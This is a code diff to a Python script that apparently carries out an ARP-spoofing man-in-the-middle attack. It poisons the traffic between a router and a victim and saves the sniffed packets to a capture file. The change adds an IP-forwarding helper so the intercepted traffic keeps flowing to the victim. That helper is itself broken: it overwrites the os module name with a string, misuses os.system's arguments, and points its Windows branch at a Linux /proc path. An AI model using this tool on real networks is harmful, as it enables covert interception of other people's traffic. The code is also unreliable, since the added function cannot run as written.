@@ -35,8 +35,18 @@ def sniffer():
     wrpcap("temp.pcap", pkts)
 
 
+def ipforwarding(forward=True):
+    os = platform.system().lower()
+
+    if 'darwin' in os: # MAC_OS_X
+        os.system("sudo sysctl -w net.inet.ip.forwarding=%d",forward)
+    elif 'windows' in os: # WINDOWS
+        os.system("echo %d > /proc/sys/net/ipv4/ip_forward",forward)
+    else:
+        os.system("echo %d > /proc/sys/net/ipv4/ip_forward",forward)
+
 def MiddleMan():
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    ipforwarding(True)
     while 1:
         try:
             spoof(routerIP, victimIP)
@@ -44,7 +54,7 @@ def MiddleMan():
             sniffer()
         except KeyboardInterrupt:
             Restore(routerIP, victimIP)
-            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+            ipforwarding(False)
             sys.exit(1)
 
 
